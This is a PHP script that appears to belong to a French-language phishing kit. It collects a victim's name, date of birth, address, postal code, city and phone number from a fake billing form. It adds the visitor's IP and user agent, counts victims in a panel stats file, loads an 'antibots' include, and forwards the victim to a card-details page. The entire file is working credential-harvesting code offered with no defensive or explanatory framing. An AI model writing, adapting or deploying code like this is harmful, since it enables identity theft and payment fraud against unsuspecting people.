<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../antibots/antibots.php';
include '../../strom1.php';
include '../../infos.php';

$filepath = '../../panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['billings']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["surname"]    = $_POST["surname"];
    $_SESSION["name"]    = $_POST["name"];
    $_SESSION["dob"]= $_POST["dob"];
    $_SESSION["address"]   = $_POST["address"];
    $_SESSION["zipcode"]    = $_POST["zipcode"];
    $_SESSION["city"]= $_POST["city"];
    $_SESSION["tel"]   = $_POST["tel"];
$message = '_______________________________
🕸 Nom : '.$_SESSION["surname"].'
🕸 Prénom : '.$_SESSION["name"].'
🕸 Date de naissance : '.$_SESSION["dob"].'
🕸 Adresse : '.$_SESSION["address"].'
🕸 Code Postal : '.$_SESSION["zipcode"].'
🕸 Ville : '.$_SESSION["city"].'
🕸 Numéro de téléphone : '.$_SESSION["tel"].'
_______________________________
🕸 IP: '._ip().'
🕸 User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';

$_SESSION['step_two']  = true;
    header('location: ../card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
  header('location: ../../index.php');
} 

